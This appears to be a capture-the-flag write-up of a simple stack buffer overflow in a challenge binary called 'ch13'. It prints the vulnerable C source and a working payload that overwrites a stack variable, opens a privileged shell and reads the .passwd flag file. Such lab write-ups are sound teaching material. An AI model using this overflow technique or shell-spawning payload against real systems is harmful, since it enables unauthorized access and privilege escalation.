# Code Analysis:

## Code Execution:

```bash
./ch13 
test

[buf]: test
[check] 0x4030201

python3 -c 'print("A" * 30)' | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x4030201

python3 -c 'print("A" * 60)' | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x41414141

You are on the right way!
```
The program takes a user input, and it can be assumed that we need to overwrite the `check` variable, given the message *"You are on the right way!"*.

## Source Code:

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
1. The program initializes `check` with the value `0x04030201`.
2. Initializes the `buf` variable of 40 bytes with user input.
3. If `check` is different from its initial value and also from the target value, the program informs us that we are on the right track.
4. If `check` equals `0xdeadbeef`, then the challenge is successful!

# Exploitation:

## How?

For `check` to equal `0xdeadbeef`, we must:
- Find the offset between `buf` and `check`.
- Replace the value of `check` with `0xdeadbeef`.

## Demonstration:

### Finding the Offset

We assume the offset is the byte size of `buf`, which is 40.

### Payload:

```bash
cat <(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 40 + b"\xef\xbe\xad\xde")') - | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
ls -a
.  ..  ch13  ch13.c  .git  Makefile  .passwd  ._perms
cat .passwd  
#################
```
